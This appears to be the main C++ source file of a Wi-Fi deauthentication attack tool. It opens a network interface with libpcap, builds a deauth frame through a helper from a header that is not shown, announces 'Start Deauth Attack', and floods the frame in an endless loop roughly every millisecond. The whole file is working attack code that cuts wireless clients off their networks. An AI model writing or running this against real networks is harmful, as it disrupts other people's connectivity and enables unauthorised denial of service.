#include "deauth-attack.h"

Param param;

int main(int argc, char const *argv[])
{
    if (param.parse(argc, argv) == false)
        return -1;
    param.info();
    
    char errbuf[BUFSIZ];
    pcap_t* pcap = pcap_open_live(param.interface, BUFSIZ, 1, 1000, errbuf);  // device, buffer size, promiscuous mode, to_ms(buffer timeout), buffer
    if (pcap == NULL){
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.interface, errbuf);
		return -1;
	}

    u_char deauth_pkt[BUFSIZ];
    int pktsize = InitDeauthPkt(deauth_pkt);

    cout << "[!] Start Deauth Attack\n" ;

    while (true)
    {
        
        /*
        pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if(res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK){
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			break;
        }
        */
        
        int res = pcap_sendpacket(pcap, deauth_pkt, pktsize);
        if(res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK){
			printf("pcap_sendpacket return %d(%s)\n", res, pcap_geterr(pcap));
			break;
        }

        this_thread::sleep_for(chrono::milliseconds(1));
    }
    
    pcap_close(pcap);

    return 0;
}
